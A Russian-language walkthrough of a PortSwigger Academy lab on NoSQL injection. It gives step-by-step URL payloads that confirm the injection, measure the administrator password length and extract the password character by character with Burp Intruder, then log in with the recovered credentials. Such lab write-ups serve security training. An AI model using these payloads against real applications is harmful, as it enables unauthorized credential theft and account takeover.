логинимся под `wiener:peter` и в прокси хттп хистори видим интересный запрос
```
GET /user/lookup?user=wiener 
```
и отправим его в `Repeater`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/12.%20NoSQL%20injection/3.%20Exploiting%20NoSQL%20injection%20to%20extract%20data/pics%20for%20walktrough/1.png)
проверим на наличие уязвимости
```
GET /user/lookup?user=wiener'+'
```
что в урл кодировке выглядит как
```
GET /user/lookup?user=wiener'%2b'
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/12.%20NoSQL%20injection/3.%20Exploiting%20NoSQL%20injection%20to%20extract%20data/pics%20for%20walktrough/2.png)
Введем 
```
GET /user/lookup?user=wiener' && '1'=='2
```
что в урле выглядит как
```
GET /user/lookup?user=wiener'+%26%26+'1'%3d%3d'2
```
и получим
```
{
  "message": "Could not find user"
}
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/12.%20NoSQL%20injection/3.%20Exploiting%20NoSQL%20injection%20to%20extract%20data/pics%20for%20walktrough/3.png)
а если
```
GET /user/lookup?user=wiener' && '1'=='1
```
 что в урле выглядит как
```
GET /user/lookup?user=wiener'+%26%26+'1'%3d%3d'1
```
увидим 200 респонс статус код
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/12.%20NoSQL%20injection/3.%20Exploiting%20NoSQL%20injection%20to%20extract%20data/pics%20for%20walktrough/4.png)
далее определим длину пароля
```
administrator' && this.password.length < 30 || 'a'=='b
```
```
GET /user/lookup?user=administrator'+%26%26+this.password.length+<+30+||+'a'%3d%3d'b
```
Далее приближаем длину пароля, и он <9 символов, а значит 8
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/12.%20NoSQL%20injection/3.%20Exploiting%20NoSQL%20injection%20to%20extract%20data/pics%20for%20walktrough/5.png)
Далее подберем сам пароль
```
GET /user/lookup?user=administrator' && this.password[0]=='a
```
```
GET /user/lookup?user=administrator'+%26%26+this.password[0]%3d%3d'a
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/12.%20NoSQL%20injection/3.%20Exploiting%20NoSQL%20injection%20to%20extract%20data/pics%20for%20walktrough/6.png)
отправим в `Intruder`
Выберем `Cluster bomb`
```
GET /user/lookup?user=administrator'+%26%26+this.password[§0§]%3d%3d'§a§
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/12.%20NoSQL%20injection/3.%20Exploiting%20NoSQL%20injection%20to%20extract%20data/pics%20for%20walktrough/8.png)

и во втором пэйлоаде выберем `a-z`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/12.%20NoSQL%20injection/3.%20Exploiting%20NoSQL%20injection%20to%20extract%20data/pics%20for%20walktrough/7.png)
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/12.%20NoSQL%20injection/3.%20Exploiting%20NoSQL%20injection%20to%20extract%20data/pics%20for%20walktrough/9.png)
отсортируем по длинне ответа 
и поймем, что наш пароль на administrator
`ihcufnln`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/12.%20NoSQL%20injection/3.%20Exploiting%20NoSQL%20injection%20to%20extract%20data/pics%20for%20walktrough/10.png)
Залогинимся под данными кредами и получим уведомление что мы молодцы
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/12.%20NoSQL%20injection/3.%20Exploiting%20NoSQL%20injection%20to%20extract%20data/pics%20for%20walktrough/11.png)
